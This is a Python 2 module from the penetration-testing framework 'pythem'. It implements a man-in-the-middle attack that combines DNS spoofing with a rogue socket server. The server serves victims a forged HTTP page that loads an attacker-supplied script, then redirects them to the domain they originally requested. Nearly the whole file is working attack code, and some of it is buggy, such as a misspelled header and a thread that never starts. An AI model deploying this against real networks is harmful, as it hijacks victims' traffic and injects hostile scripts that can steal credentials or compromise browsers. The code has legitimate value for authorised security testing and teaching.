#!/usr/bin/python

# Copyright (c) 2016-2018 Angelo Moura
#
# This file is part of the program pythem
#
# pythem is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import socket
import sys
import threading


class Redirect(object):
    name = "Redirect"
    desc = "Redirect to page with script then let client go"
    version = "0.3"
    ps = "Will need to change the way of injection to netfilter packet injection."

    def __init__(self, host, port, js):
        self.host = host
        self.port = port
        from dnspoisoner import DNSspoof
        self.dnsspoof = DNSspoof(self.host)
        if js != None:
            self.js = js
        else:
            try:
                self.js = raw_input("[+] Enter the script source: ")
            except KeyboardInterrupt:
                pass

        self.response = """ HTTP/1.1 200 OK
Date: Thu, 12 Apr 2016 15:25 GMT
Server: Apache/2.2.17 (Unix) mod ssl/2.2 17 OpenSSL/0.9.8l DAV/2
Last-Modified: Sat, 28 Aug 2015 22:17:02 GMT
ETag: "20e2b8b-3c-48ee99731f380"
Accept-Ranges: bytes
Content-Lenght: 90
Connection: close
Content-Type: text/html


<head>
<script src= {}></script>
</head>
""".format(self.js)

    def start(self):
        self.t = threading.Thread(name='Redirection', target=self.server)
        self.t.setDaemon(True)
        self.t.start

    def stop(self):
        try:
            self.t.stop()
            print "[-] Redirect with script injection finalized."
        except Exception as e:
            print "[!] Exception caught: {}".format(e)

    def server(self):
        print "[+] Redirect with script injection initialized."
        self.dnsspoof.start(None, "Inject")

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_address = (self.host, self.port)
        print '[+] Injection URL - http://{}:{}'.format(self.host, self.port)
        server.bind(server_address)
        server.listen(1)

        for i in range(0, 2):
            if i >= 1:
                domain = self.dnsspoof.getdomain()
                domain = domain[:-1]
                print "[+] Target was requesting: {}".format(domain)
                self.dnsspoof.stop()

                try:
                    connection, client_address = server.accept()
                    redirect = self.response + """<body> <meta http-equiv="refresh" content="0; URL='http://{}"/> </body>""".format(
                        domain)
                    connection.send("%s" % redirect)
                    print "[+] Script Injected on: ", client_address
                    connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
                    connection.close()
                except KeyboardInterrupt:
                    server.close()

            try:
                connection, client_address = server.accept()
                connection.send("%s" % self.response)
                connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
                connection.close()
            except KeyboardInterrupt:
                server.close()
